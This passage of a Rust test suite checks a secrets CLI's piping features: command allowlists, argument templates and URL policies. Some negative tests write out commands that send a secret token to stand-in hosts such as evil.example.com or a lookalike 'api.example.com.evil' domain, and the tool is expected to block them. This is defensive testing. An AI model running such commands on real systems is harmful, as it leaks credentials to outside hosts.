    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("secret `missing` was not found"));
    assert!(stderr.contains("gloves list"));
    assert!(stderr.contains("gloves secrets get <secret-name>"));
}

#[test]
fn cli_get_preserves_non_utf8_bytes_without_newline() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let expected = vec![0xff, 0x00, 0x61, 0x80];

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "bin", "--stdin", "--ttl", "1",
        ])
        .write_stdin(expected.clone())
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "bin",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(output, expected);
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_handles_early_reader_exit() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let huge = vec![b'A'; 5_000_000];
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("drain-one-byte"),
        r#"#!/usr/bin/env bash
set -euo pipefail
head -c 1 >/dev/null || true
"#,
    );

    let mut child = std::process::Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "huge", "--stdin", "--ttl", "1",
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(&huge).unwrap();
    let output = child.wait_with_output().unwrap();
    assert!(output.status.success());

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "drain-one-byte")
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "huge",
            "--pipe-to",
            "drain-one-byte",
        ])
        .assert()
        .get_output()
        .clone();
    assert!(
        output.status.success(),
        "expected success, got stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
fn cli_get_non_tty_requires_pipe_target() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "x", "--value", "secret", "--ttl", "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "secrets", "get", "x"])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "refusing to write secret bytes to non-tty stdout",
        ));
}

#[test]
fn cli_get_pipe_to_requires_allowlist() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "x", "--value", "secret", "--ttl", "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("secret piping is disabled"));
}

#[test]
fn cli_get_pipe_to_rejects_unallowlisted_command() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "x", "--value", "secret", "--ttl", "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args(["--root", root, "secrets", "get", "x", "--pipe-to", "tee"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("not allowlisted"));
}

#[test]
fn cli_get_pipe_to_rejects_non_bare_command_names() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "x", "--value", "secret", "--ttl", "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args(["--root", root, "secrets", "get", "x", "--pipe-to", "./cat"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("must be a bare executable name"));
}

#[test]
fn cli_get_pipe_to_allowed_command_streams_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "x", "--value", "secret", "--ttl", "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("secret"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_interpolates_secret_into_arguments() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg prefix:{secret}:suffix",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("prefix:secret-token:suffix"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_requires_secret_placeholder() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg literal-value",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("{secret}"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_policy_allows_only_matching_templates() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let policy = r#"{"print-arg":["print-arg prefix:{secret}:suffix"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg prefix:{secret}:suffix",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("prefix:secret-token:suffix"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_policy_rejects_non_matching_templates() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let policy = r#"{"print-arg":["print-arg prefix:{secret}:suffix"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg different:{secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by GLOVES_GET_PIPE_ARG_POLICY",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_policy_requires_command_entry() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let policy = r#"{"cat":["cat {secret}"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg prefix:{secret}:suffix",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "is not allowed by GLOVES_GET_PIPE_ARG_POLICY",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_policy_rejects_invalid_json() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_ARG_POLICY_ENV_VAR, "not-json")
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg prefix:{secret}:suffix",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "GLOVES_GET_PIPE_ARG_POLICY must be valid JSON",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_allows_same_url_with_different_payloads() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} --data one https://api.example.com/v1/contacts",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("auth:secret-token"));

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} --data two https://api.example.com/v1/contacts",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("auth:secret-token"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_rejects_other_urls() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} --data one https://evil.example.com/contacts",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by GLOVES_GET_PIPE_URL_POLICY",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_requires_url_argument() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} --data one",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "must include at least one http(s) URL argument",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_rejects_invalid_json() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, "not-json")
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com/v1/contacts",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "GLOVES_GET_PIPE_URL_POLICY must be valid JSON",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_rejects_query_or_fragment_prefix() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1/?token=abc"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com/v1/contacts",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "must not include query or fragment components",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_supports_wget() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("wget"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$2"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"wget":["https://api.example.com/v1/"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "wget")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "wget --quiet https://api.example.com/v1/items?token={secret}",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("token=secret-token"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_rejects_host_boundary_bypass() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com.evil/v1/contacts",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by GLOVES_GET_PIPE_URL_POLICY",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_enforces_path_segment_boundary() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com/v10/contacts",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by GLOVES_GET_PIPE_URL_POLICY",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_allows_exact_authority_and_path_match() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com/v1"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com/v1",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("auth:secret-token"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_allows_exact_authority_without_explicit_path() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("print-arg"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$1"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let url_policy = r#"{"print-arg":["https://api.example.com"]}"#;

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "print-arg auth:{secret} https://api.example.com",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("auth:secret-token"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_from_config_allows_configured_command() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("applecli"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$*"
"#,
    );
    write_pipe_url_policy_config(
        &config_path,
        &root,
        "applecli",
        true,
        &["https://api.example.com/v1/"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "applecli --data one https://api.example.com/v1/contacts?token={secret}",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("token=secret-token"));

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "applecli --data two https://api.example.com/v1/contacts?token={secret}",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("token=secret-token"));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_from_config_rejects_other_urls() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("applecli"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$*"
"#,
    );
    write_pipe_url_policy_config(
        &config_path,
        &root,
        "applecli",
        true,
        &["https://api.example.com/v1/"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "applecli --data one https://evil.example.com/contacts?token={secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by .gloves.toml [secrets.pipe.commands.applecli]",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_from_config_rejects_host_boundary_bypass() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("applecli"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$*"
"#,
    );
    write_pipe_url_policy_config(
        &config_path,
        &root,
        "applecli",
        true,
        &["https://api.example.com"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "applecli --data one https://api.example.com.evil/contacts?token={secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "not allowlisted by .gloves.toml [secrets.pipe.commands.applecli]",
        ));
}

#[cfg(unix)]
#[test]
fn cli_get_pipe_to_args_url_policy_from_config_requires_url_when_enabled() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let fake_bin = temp_dir.path().join("fake-bin");
    fs::create_dir_all(&fake_bin).unwrap();
    write_executable(
        &fake_bin.join("applecli"),
        r#"#!/usr/bin/env bash
set -euo pipefail
printf '%s' "$*"
"#,
    );
    write_pipe_url_policy_config(
        &config_path,
        &root,
        "applecli",
        true,
        &["https://api.example.com/v1/"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "secret-token",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
        .args([
            "--config",
